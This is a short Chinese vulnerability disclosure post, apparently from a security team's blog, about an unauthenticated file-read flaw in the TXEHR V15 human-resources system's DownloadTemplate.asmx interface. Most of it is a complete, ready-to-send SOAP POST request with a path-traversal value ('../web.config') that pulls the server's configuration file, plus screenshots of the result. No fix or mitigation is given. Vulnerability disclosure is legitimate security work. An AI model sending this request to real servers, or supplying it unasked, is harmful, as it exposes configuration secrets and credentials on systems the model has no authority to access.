#  同享人力资源管理系统-TXEHR V15 DownloadTemplate 文件读取漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-02 22:41  
  
## 1. 漏洞描述  
  
	  
同享人力资源管理系统-TXEHR V15 DownloadTemplate.asmx 接口处存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zUcr0ib9h7OSEfxqyFzVgPt5j3I7dr0mzcic1wmctDeCtS2OvPOuEA4sPZUpGHxia3xXMfEM8LowVHhA/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
POST /Service/DownloadTemplate.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 333
SOAPAction: "http://tempuri.org/DownloadFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><DownloadFile xmlns="http://tempuri.org/"><path>../web.config</path></DownloadFile></soap:Body></soap:Envelope>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zUcr0ib9h7OSEfxqyFzVgPt5op8wGaI4BANJRCvicRHsOqTsPRRApx9YT78S63XAibHLcpZTNb2YrVdQ/640?wx_fmt=png&from=appmsg "")  
  
  
